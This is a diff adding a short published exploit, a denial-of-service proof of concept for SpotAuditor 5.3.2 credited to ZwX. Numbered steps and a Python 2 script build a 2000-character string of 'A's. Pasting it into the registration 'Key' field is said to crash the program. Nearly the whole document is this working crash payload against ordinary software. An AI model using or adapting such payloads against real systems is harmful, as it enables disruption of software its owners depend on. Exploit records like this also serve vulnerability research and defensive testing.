@@ -1,0 +1,31 @@
+#Exploit Title: SpotAuditor 5.3.2 - 'Key' Denial of Service
+#Exploit Author : ZwX
+#Exploit Date: 2019-11-28
+#Vendor Homepage : http://www.nsauditor.com/
+#Link Software : http://spotauditor.nsauditor.com/downloads/spotauditor_setup.exe
+#Tested on OS: Windows 7
+#Social: twitter.com/ZwX2a
+
+'''
+Proof of Concept (PoC):
+=======================
+
+1.Download and install SpotAuditor
+2.Run the python operating script that will create a file (poc.txt)
+3.Run the software "Register -> Enter Registration Code
+4.Copy and paste the characters in the file (poc.txt)
+5.Paste the characters in the field 'Key' and click on 'Ok'
+6.SpotAuditor Crashed
+'''
+#!/usr/bin/python
+
+http = "http//"
+buffer = "\x41" * 2000
+
+
+poc = http + buffer 
+file = open("poc.txt","w")
+file.write(poc)
+file.close()
+ 
+print "POC Created by ZwX"
